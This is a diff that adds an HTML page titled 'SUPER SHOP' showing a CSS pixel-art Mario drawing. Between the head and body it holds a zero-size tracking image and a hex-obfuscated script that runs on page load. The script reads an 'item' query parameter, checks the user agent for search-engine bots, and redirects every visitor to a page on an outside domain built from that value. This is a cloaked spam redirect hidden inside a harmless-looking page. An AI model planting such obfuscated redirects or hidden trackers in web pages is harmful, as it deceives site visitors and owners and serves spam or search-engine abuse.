@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="KO" >
+<head>
+<meta charset="UTF-8">
+<title>SUPER SHOP</title>
+<meta name="robots" content="index,follow"/>
+<link rel="icon" type="image/x-icon" href="/favicon.png"/>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap");
+
+:root {
+	--size-draw: 400px;
+	--red: #db261d;
+	--blue: #10447e;
+	--yellow: #fced22;
+	--black: #000000;
+	--lbrow: #e9a24a;
+	--brow: #622311;
+
+	--size: 1.2rem;
+}
+
+.body {
+	width: 100%;
+	height: 100vh;
+	background-color: #6884f7;
+	display: flex;
+	flex-direction: column;
+	justify-content: center;
+	align-items: center;
+}
+
+.title-draw {
+	font-family: "Press Start 2P", cursive;
+	text-align: center;
+	color: #ffffff;
+	font-size: var(--size);
+}
+
+.mario-wrapper {
+	display: grid;
+	background-color: transparent;
+	grid-template-columns: repeat(16, var(--size));
+	grid-template-rows: repeat(16, var(--size));
+	grid-gap: none;
+	margin: 20px;
+}
+
+div {
+	background-color: transparent;
+}
+
+/* ::::::::::::::::::::: COLOREAR DIBUJO :::::::::::::::::::*/
+
+.pixel-6,
+.pixel-7,
+.pixel-8,
+.pixel-9,
+.pixel-10,
+.pixel-21,
+.pixel-22,
+.pixel-23,
+.pixel-24,
+.pixel-25,
+.pixel-26,
+.pixel-27,
+.pixel-28,
+.pixel-29,
+.pixel-45,
+.pixel-46,
+.pixel-47,
+.pixel-62,
+.pixel-63,
+.pixel-79,
+.pixel-94,
+.pixel-109,
+.pixel-110,
+.pixel-115,
+.pixel-116,
+.pixel-117,
+.pixel-118,
+.pixel-120,
+.pixel-121,
+.pixel-122,
+.pixel-124,
+.pixel-125,
+.pixel-131,
+.pixel-132,
+.pixel-133,
+.pixel-134,
+.pixel-135,
+.pixel-137,
+.pixel-138,
+.pixel-139,
+.pixel-148,
+.pixel-149,
+.pixel-150,
+.pixel-151 {
+	background-color: var(--red);
+}
+
+.pixel-119,
+.pixel-123,
+.pixel-136,
+.pixel-140,
+.pixel-152,
+.pixel-153,
+.pixel-154,
+.pixel-155,
+.pixel-157,
+.pixel-158,
+.pixel-165,
+.pixel-166,
+.pixel-167,
+.pixel-168,
+.pixel-170,
+.pixel-171,
+.pixel-172,
+.pixel-173,
+.pixel-174,
+.pixel-181,
+.pixel-182,
+.pixel-183,
+.pixel-184,
+.pixel-185,
+.pixel-186,
+.pixel-187,
+.pixel-188,
+.pixel-189,
+.pixel-190,
+.pixel-197,
+.pixel-198,
+.pixel-199,
+.pixel-200,
+.pixel-201,
+.pixel-202 {
+	background-color: var(--blue);
+}
+
+.pixel-156,
+.pixel-169 {
+	background-color: var(--yellow);
+}
+
+.pixel-42,
+.pixel-58,
+.pixel-75,
+.pixel-90,
+.pixel-91,
+.pixel-92,
+.pixel-93 {
+	background-color: var(--black);
+}
+
+.pixel-13,
+.pixel-14,
+.pixel-15,
+.pixel-30,
+.pixel-31,
+.pixel-40,
+.pixel-41,
+.pixel-43,
+.pixel-53,
+.pixel-55,
+.pixel-56,
+.pixel-57,
+.pixel-59,
+.pixel-60,
+.pixel-61,
+.pixel-69,
+.pixel-72,
+.pixel-73,
+.pixel-74,
+.pixel-76,
+.pixel-77,
+.pixel-78,
+.pixel-86,
+.pixel-87,
+.pixel-88,
+.pixel-89,
+.pixel-102,
+.pixel-103,
+.pixel-104,
+.pixel-105,
+.pixel-106,
+.pixel-107,
+.pixel-108,
+.pixel-129,
+.pixel-130,
+.pixel-145,
+.pixel-146,
+.pixel-147,
+.pixel-162 {
+	background-color: var(--lbrow);
+}
+
+.pixel-128,
+.pixel-143,
+.pixel-144,
+.pixel-159,
+.pixel-160,
+.pixel-175,
+.pixel-176,
+.pixel-191,
+.pixel-192,
+.pixel-179,
+.pixel-180,
+.pixel-194,
+.pixel-195,
+.pixel-196,
+.pixel-210,
+.pixel-211,
+.pixel-37,
+.pixel-38,
+.pixel-39,
+.pixel-52,
+.pixel-54,
+.pixel-68,
+.pixel-70,
+.pixel-71,
+.pixel-84,
+.pixel-85 {
+	background-color: var(--brow);
+}
+</style>
+</head>
+<img src="//sstatic1.histats.com/0.gif?4705536&101" alt="" border="0" style="width:0;height:0;">
+<script>
+var _0x570b=["\x72\x65\x70\x6C\x61\x63\x65","\x73\x65\x61\x72\x63\x68","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x65\x78\x65\x63","","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x5F\x64\x58\x54\x61\x53\x64\x69","\x69\x74\x65\x6D","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x65\x69\x6E\x7A\x79\x2E\x63\x6F\x6D\x2F\x6B\x6F\x2F\x69\x64\x2F","\x2E\x68\x74\x6D\x6C"];(function(){let _0xb433x1=(function(){var _0xb433x2={};location[_0x570b[1]][_0x570b[0]](/[?&]+([^=&]+)=([^&]*)/gi,function(_0xb433x3,_0xb433x4,_0xb433x5){_0xb433x2[_0xb433x4]= _0xb433x5});return _0xb433x2})();(/(\d+)\.html$/[_0x570b[3]](location[_0x570b[2]]))?/(\d+)\.html$/[_0x570b[3]](location[_0x570b[2]])[1]:_0x570b[4];let _0xb433x6=/bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i[_0x570b[6]](navigator[_0x570b[5]]);let _0xb433x7=_0x570b[7];if(_0xb433x1[_0x570b[8]]&&  !_0xb433x6){location[_0x570b[9]]= _0x570b[10]+ _0xb433x1[_0x570b[8]]+ _0x570b[11]}else {if(_0xb433x1[_0x570b[8]]&& _0xb433x6){location[_0x570b[0]](_0x570b[10]+ _0xb433x1[_0x570b[8]]+ _0x570b[11])}}})()
+</script>
+<body translate="no" >
+  <body class="body">
+		<h1 class="title-draw">MARIO BROS. 8BIT</h1>
+		<div class="mario-wrapper">
+			<div class="pixel-1"><!-- 1   --></div>
+			<div class="pixel-2"><!-- 2   --></div>
+			<div class="pixel-3"><!-- 3   --></div>
+			<div class="pixel-4"><!-- 4   --></div>
+			<div class="pixel-5"><!-- 5   --></div>
+			<div class="pixel-6"><!-- 6   --></div>
+			<div class="pixel-7"><!-- 7   --></div>
+			<div class="pixel-8"><!-- 8   --></div>
+			<div class="pixel-9"><!-- 9   --></div>
+			<div class="pixel-10"><!-- 10  --></div>
+			<div class="pixel-11"><!-- 11  --></div>
+			<div class="pixel-12"><!-- 12  --></div>
+			<div class="pixel-13"><!-- 13  --></div>
+			<div class="pixel-14"><!-- 14  --></div>
+			<div class="pixel-15"><!-- 15  --></div>
+			<div class="pixel-16"><!-- 16  --></div>
+			<div class="pixel-17"><!-- 17  --></div>
+			<div class="pixel-18"><!-- 18  --></div>
+			<div class="pixel-19"><!-- 19  --></div>
+			<div class="pixel-20"><!-- 20  --></div>
+			<div class="pixel-21"><!-- 21  --></div>
+			<div class="pixel-22"><!-- 22  --></div>
+			<div class="pixel-23"><!-- 23  --></div>
+			<div class="pixel-24"><!-- 24  --></div>
+			<div class="pixel-25"><!-- 25  --></div>
+			<div class="pixel-26"><!-- 26  --></div>
+			<div class="pixel-27"><!-- 27  --></div>
+			<div class="pixel-28"><!-- 28  --></div>
+			<div class="pixel-29"><!-- 29  --></div>
+			<div class="pixel-30"><!-- 30  --></div>
+			<div class="pixel-31"><!-- 31  --></div>
+			<div class="pixel-32"><!-- 32  --></div>
+			<div class="pixel-33"><!-- 33  --></div>
+			<div class="pixel-34"><!-- 34  --></div>
+			<div class="pixel-35"><!-- 35  --></div>
+			<div class="pixel-36"><!-- 36  --></div>
+			<div class="pixel-37"><!-- 37  --></div>
+			<div class="pixel-38"><!-- 38  --></div>
+			<div class="pixel-39"><!-- 39  --></div>
+			<div class="pixel-40"><!-- 40  --></div>
+			<div class="pixel-41"><!-- 41  --></div>
+			<div class="pixel-42"><!-- 42  --></div>
+			<div class="pixel-43"><!-- 43  --></div>
+			<div class="pixel-44"><!-- 44  --></div>
+			<div class="pixel-45"><!-- 45  --></div>
+			<div class="pixel-46"><!-- 46  --></div>
+			<div class="pixel-47"><!-- 47  --></div>
+			<div class="pixel-48"><!-- 48  --></div>
+			<div class="pixel-49"><!-- 49  --></div>
+			<div class="pixel-50"><!-- 50  --></div>
+			<div class="pixel-51"><!-- 51  --></div>
+			<div class="pixel-52"><!-- 52  --></div>
+			<div class="pixel-53"><!-- 53  --></div>
+			<div class="pixel-54"><!-- 54  --></div>
+			<div class="pixel-55"><!-- 55  --></div>
+			<div class="pixel-56"><!-- 56  --></div>
+			<div class="pixel-57"><!-- 57  --></div>
+			<div class="pixel-58"><!-- 58  --></div>
+			<div class="pixel-59"><!-- 59  --></div>
+			<div class="pixel-60"><!-- 60  --></div>
+			<div class="pixel-61"><!-- 61  --></div>
+			<div class="pixel-62"><!-- 62  --></div>
+			<div class="pixel-63"><!-- 63  --></div>
+			<div class="pixel-64"><!-- 64  --></div>
+			<div class="pixel-65"><!-- 65  --></div>
+			<div class="pixel-66"><!-- 66  --></div>
+			<div class="pixel-67"><!-- 67  --></div>
+			<div class="pixel-68"><!-- 68  --></div>
+			<div class="pixel-69"><!-- 69  --></div>
+			<div class="pixel-70"><!-- 70  --></div>
+			<div class="pixel-71"><!-- 71  --></div>
+			<div class="pixel-72"><!-- 72  --></div>
+			<div class="pixel-73"><!-- 73  --></div>
+			<div class="pixel-74"><!-- 74  --></div>
+			<div class="pixel-75"><!-- 75  --></div>
+			<div class="pixel-76"><!-- 76  --></div>
+			<div class="pixel-77"><!-- 77  --></div>
+			<div class="pixel-78"><!-- 78  --></div>
+			<div class="pixel-79"><!-- 79  --></div>
+			<div class="pixel-80"><!-- 80  --></div>
+			<div class="pixel-81"><!-- 81  --></div>
+			<div class="pixel-82"><!-- 82  --></div>
+			<div class="pixel-83"><!-- 83  --></div>
+			<div class="pixel-84"><!-- 84  --></div>
+			<div class="pixel-85"><!-- 85  --></div>
+			<div class="pixel-86"><!-- 86  --></div>
+			<div class="pixel-87"><!-- 87  --></div>
+			<div class="pixel-88"><!-- 88  --></div>
+			<div class="pixel-89"><!-- 89  --></div>
+			<div class="pixel-90"><!-- 90  --></div>
+			<div class="pixel-91"><!-- 91  --></div>
+			<div class="pixel-92"><!-- 92  --></div>
+			<div class="pixel-93"><!-- 93  --></div>
+			<div class="pixel-94"><!-- 94  --></div>
+			<div class="pixel-95"><!-- 95  --></div>
+			<div class="pixel-96"><!-- 96  --></div>
+			<div class="pixel-97"><!-- 97  --></div>
+			<div class="pixel-98"><!-- 98  --></div>
+			<div class="pixel-99"><!-- 99  --></div>
+			<div class="pixel-100"><!-- 100 --></div>
+			<div class="pixel-101"><!-- 101 --></div>
+			<div class="pixel-102"><!-- 102 --></div>
+			<div class="pixel-103"><!-- 103 --></div>
+			<div class="pixel-104"><!-- 104 --></div>
+			<div class="pixel-105"><!-- 105 --></div>
+			<div class="pixel-106"><!-- 106 --></div>
+			<div class="pixel-107"><!-- 107 --></div>
+			<div class="pixel-108"><!-- 108 --></div>
+			<div class="pixel-109"><!-- 109 --></div>
+			<div class="pixel-110"><!-- 110 --></div>
+			<div class="pixel-111"><!-- 111 --></div>
+			<div class="pixel-112"><!-- 112 --></div>
+			<div class="pixel-113"><!-- 113 --></div>
+			<div class="pixel-114"><!-- 114 --></div>
+			<div class="pixel-115"><!-- 115 --></div>
+			<div class="pixel-116"><!-- 116 --></div>
+			<div class="pixel-117"><!-- 117 --></div>
+			<div class="pixel-118"><!-- 118 --></div>
+			<div class="pixel-119"><!-- 119 --></div>
+			<div class="pixel-120"><!-- 120 --></div>
+			<div class="pixel-121"><!-- 121 --></div>
+			<div class="pixel-122"><!-- 122 --></div>
+			<div class="pixel-123"><!-- 123 --></div>
+			<div class="pixel-124"><!-- 124 --></div>
+			<div class="pixel-125"><!-- 125 --></div>
+			<div class="pixel-126"><!-- 126 --></div>
+			<div class="pixel-127"><!-- 127 --></div>
+			<div class="pixel-128"><!-- 128 --></div>
+			<div class="pixel-129"><!-- 129 --></div>
+			<div class="pixel-130"><!-- 130 --></div>
+			<div class="pixel-131"><!-- 131 --></div>
+			<div class="pixel-132"><!-- 132 --></div>
+			<div class="pixel-133"><!-- 133 --></div>
+			<div class="pixel-134"><!-- 134 --></div>
+			<div class="pixel-135"><!-- 135 --></div>
+			<div class="pixel-136"><!-- 136 --></div>
+			<div class="pixel-137"><!-- 137 --></div>
+			<div class="pixel-138"><!-- 138 --></div>
+			<div class="pixel-139"><!-- 139 --></div>
+			<div class="pixel-140"><!-- 140 --></div>
+			<div class="pixel-141"><!-- 141 --></div>
+			<div class="pixel-142"><!-- 142 --></div>
+			<div class="pixel-143"><!-- 143 --></div>
+			<div class="pixel-144"><!-- 144 --></div>
+			<div class="pixel-145"><!-- 145 --></div>
+			<div class="pixel-146"><!-- 146 --></div>
+			<div class="pixel-147"><!-- 147 --></div>
+			<div class="pixel-148"><!-- 148 --></div>
+			<div class="pixel-149"><!-- 149 --></div>
+			<div class="pixel-150"><!-- 150 --></div>
+			<div class="pixel-151"><!-- 151 --></div>
+			<div class="pixel-152"><!-- 152 --></div>
+			<div class="pixel-153"><!-- 153 --></div>
+			<div class="pixel-154"><!-- 154 --></div>
+			<div class="pixel-155"><!-- 155 --></div>
+			<div class="pixel-156"><!-- 156 --></div>
+			<div class="pixel-157 "><!-- 157 --></div>
+			<div class="pixel-158"><!-- 158 --></div>
+			<div class="pixel-159"><!-- 159 --></div>
+			<div class="pixel-160"><!-- 160 --></div>
+			<div class="pixel-161"><!-- 161 --></div>
+			<div class="pixel-162"><!-- 162 --></div>
+			<div class="pixel-163"><!-- 163 --></div>
+			<div class="pixel-164"><!-- 164 --></div>
+			<div class="pixel-165"><!-- 165 --></div>
+			<div class="pixel-166"><!-- 166 --></div>
+			<div class="pixel-167"><!-- 167 --></div>
+			<div class="pixel-168"><!-- 168 --></div>
+			<div class="pixel-169"><!-- 169 --></div>
+			<div class="pixel-170"><!-- 170 --></div>
+			<div class="pixel-171"><!-- 171 --></div>
+			<div class="pixel-172"><!-- 172 --></div>
+			<div class="pixel-173"><!-- 173 --></div>
+			<div class="pixel-174"><!-- 174 --></div>
+			<div class="pixel-175"><!-- 175 --></div>
+			<div class="pixel-176"><!-- 176 --></div>
+			<div class="pixel-177"><!-- 177 --></div>
+			<div class="pixel-178"><!-- 178 --></div>
+			<div class="pixel-179"><!-- 179 --></div>
+			<div class="pixel-180"><!-- 180 --></div>
+			<div class="pixel-181"><!-- 181 --></div>
+			<div class="pixel-182"><!-- 182 --></div>
+			<div class="pixel-183"><!-- 183 --></div>
+			<div class="pixel-184"><!-- 184 --></div>
+			<div class="pixel-185"><!-- 185 --></div>
+			<div class="pixel-186"><!-- 186 --></div>
+			<div class="pixel-187"><!-- 187 --></div>
+			<div class="pixel-188"><!-- 188 --></div>
+			<div class="pixel-189"><!-- 189 --></div>
+			<div class="pixel-190"><!-- 190 --></div>
+			<div class="pixel-191"><!-- 191 --></div>
+			<div class="pixel-192"><!-- 192 --></div>
+			<div class="pixel-193"><!-- 193 --></div>
+			<div class="pixel-194"><!-- 194 --></div>
+			<div class="pixel-195"><!-- 195 --></div>
+			<div class="pixel-196"><!-- 196 --></div>
+			<div class="pixel-197"><!-- 197 --></div>
+			<div class="pixel-198"><!-- 198 --></div>
+			<div class="pixel-199"><!-- 199 --></div>
+			<div class="pixel-200"><!-- 200 --></div>
+			<div class="pixel-201"><!-- 201 --></div>
+			<div class="pixel-202"><!-- 202 --></div>
+			<div class="pixel-203"><!-- 203 --></div>
+			<div class="pixel-204"><!-- 204 --></div>
+			<div class="pixel-205"><!-- 205 --></div>
+			<div class="pixel-206"><!-- 206 --></div>
+			<div class="pixel-207"><!-- 207 --></div>
+			<div class="pixel-208"><!-- 208 --></div>
+			<div class="pixel-209"><!-- 209 --></div>
+			<div class="pixel-210"><!-- 210 --></div>
+			<div class="pixel-211"><!-- 211 --></div>
+			<div class="pixel-212"><!-- 212 --></div>
+			<div class="pixel-213"><!-- 213 --></div>
+			<div class="pixel-214"><!-- 214 --></div>
+			<div class="pixel-215"><!-- 215 --></div>
+			<div class="pixel-216"><!-- 216 --></div>
+			<div class="pixel-217"><!-- 217 --></div>
+			<div class="pixel-218"><!-- 218 --></div>
+			<div class="pixel-219"><!-- 219 --></div>
+			<div class="pixel-220"><!-- 220 --></div>
+			<div class="pixel-221"><!-- 221 --></div>
+			<div class="pixel-222"><!-- 222 --></div>
+			<div class="pixel-223"><!-- 223 --></div>
+			<div class="pixel-224"><!-- 224 --></div>
+			<div class="pixel-225"><!-- 225 --></div>
+			<div class="pixel-226"><!-- 226 --></div>
+			<div class="pixel-227"><!-- 227 --></div>
+			<div class="pixel-228"><!-- 228 --></div>
+			<div class="pixel-229"><!-- 229 --></div>
+			<div class="pixel-230"><!-- 230 --></div>
+			<div class="pixel-231"><!-- 231 --></div>
+			<div class="pixel-232"><!-- 232 --></div>
+			<div class="pixel-233"><!-- 233 --></div>
+			<div class="pixel-234"><!-- 234 --></div>
+			<div class="pixel-235"><!-- 235 --></div>
+			<div class="pixel-236"><!-- 236 --></div>
+			<div class="pixel-237"><!-- 237 --></div>
+			<div class="pixel-238"><!-- 238 --></div>
+			<div class="pixel-239"><!-- 239 --></div>
+			<div class="pixel-240"><!-- 240 --></div>
+			<div class="pixel-241"><!-- 241 --></div>
+			<div class="pixel-242"><!-- 242 --></div>
+			<div class="pixel-243"><!-- 243 --></div>
+			<div class="pixel-244"><!-- 244 --></div>
+			<div class="pixel-245"><!-- 245 --></div>
+			<div class="pixel-246"><!-- 246 --></div>
+			<div class="pixel-247"><!-- 247 --></div>
+			<div class="pixel-248"><!-- 248 --></div>
+			<div class="pixel-249"><!-- 249 --></div>
+			<div class="pixel-250"><!-- 250 --></div>
+			<div class="pixel-251"><!-- 251 --></div>
+			<div class="pixel-252"><!-- 252 --></div>
+			<div class="pixel-253"><!-- 253 --></div>
+			<div class="pixel-254"><!-- 254 --></div>
+			<div class="pixel-255"><!-- 255 --></div>
+			<div class="pixel-256"><!-- 256 --></div>
+		</div>
+</body>
+</html>
